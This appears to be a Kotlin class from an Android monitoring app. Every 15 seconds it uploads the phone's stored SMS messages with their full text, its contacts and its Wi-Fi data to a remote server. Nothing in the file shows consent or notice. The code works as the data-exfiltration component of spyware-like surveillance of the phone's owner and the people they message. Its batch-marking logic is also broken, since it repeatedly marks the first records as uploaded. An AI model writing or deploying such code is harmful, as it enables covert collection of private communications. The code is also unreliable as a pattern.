package com.empresa.monitor.service.system

import android.content.Context
import com.empresa.monitor.data.api.ApiClient
import com.empresa.monitor.data.api.MonitorApi
import com.empresa.monitor.data.bean.*
import com.empresa.monitor.data.db.MonitorDatabase
import com.empresa.monitor.data.model.*
import kotlinx.coroutines.*
import java.text.SimpleDateFormat
import java.util.*

class DataUploader(private val context: Context) {

    private val db = MonitorDatabase.getInstance(context)
    private val api: MonitorApi = ApiClient.api
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var isRunning = false
    private var deviceId: String? = null

    private val isoFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).apply {
        timeZone = TimeZone.getTimeZone("UTC")
    }

    fun start(deviceId: String) {
        this.deviceId = deviceId
        if (isRunning) return
        isRunning = true

        scope.launch {
            while (isActive) {
                uploadAll()
                delay(15_000) // every 15 seconds
            }
        }
    }

    fun stop() {
        isRunning = false
        scope.cancel()
    }

    private suspend fun uploadAll() {
        val id = deviceId ?: return

        coroutineScope {
            launch { uploadSms(id) }
            launch { uploadContacts(id) }
            launch { uploadWifi(id) }
        }
    }

    private suspend fun uploadSms(deviceId: String) {
        try {
            val unuploaded = db.smsDao().getUnuploaded()
            if (unuploaded.isEmpty()) return

            for (sms in unuploaded) {
                val response = api.sendSms(deviceId, SmsApiRequest(
                    smsId = sms.smsId,
                    address = sms.address,
                    contactName = sms.contactName,
                    body = sms.body,
                    type = sms.type,
                    date = isoFormat.format(Date(sms.date)),
                    isMms = sms.isMms,
                    read = sms.read
                ))
                if (response.isSuccessful) {
                    db.smsDao().markUploaded(sms.id)
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private suspend fun uploadContacts(deviceId: String) {
        try {
            val unuploaded = db.contactDao().getUnuploaded()
            if (unuploaded.isEmpty()) return

            val contacts = unuploaded.map { contact ->
                ContactApiRequest(
                    name = contact.name,
                    phone = contact.phone,
                    phoneType = contact.phoneType,
                    email = contact.email,
                    photoUrl = null, // would need to upload separately
                    timesContacted = contact.timesContacted,
                    lastTimeContacted = contact.lastTimeContacted?.let { isoFormat.format(Date(it)) },
                    starred = contact.starred
                )
            }

            // Send in batches
            contacts.chunked(50).forEach { batch ->
                val response = api.sendContacts(deviceId, batch)
                if (response.isSuccessful) {
                    batch.forEach { _ ->
                        // Could track individual ones, but for efficiency just mark all
                    }
                    // Mark all in this batch as uploaded
                    for (contact in unuploaded.take(batch.size)) {
                        db.contactDao().markUploaded(contact.id)
                    }
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private suspend fun uploadWifi(deviceId: String) {
        try {
            val unuploaded = db.wifiDao().getUnuploaded()
            if (unuploaded.isEmpty()) return

            val wifiList = unuploaded.map { wifi ->
                WifiApiRequest(
                    ssid = wifi.ssid,
                    bssid = wifi.bssid,
                    capabilities = wifi.capabilities,
                    frequency = wifi.frequency,
                    rssi = wifi.rssi,
                    isConnected = wifi.isConnected,
                    ipAddress = wifi.ipAddress,
                    linkSpeed = wifi.linkSpeed
                )
            }

            wifiList.chunked(20).forEach { batch ->
                val response = api.sendWifi(deviceId, batch)
                if (response.isSuccessful) {
                    for (wifi in unuploaded.take(batch.size)) {
                        db.wifiDao().markUploaded(wifi.id)
                    }
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    fun destroy() {
        stop()
    }
}
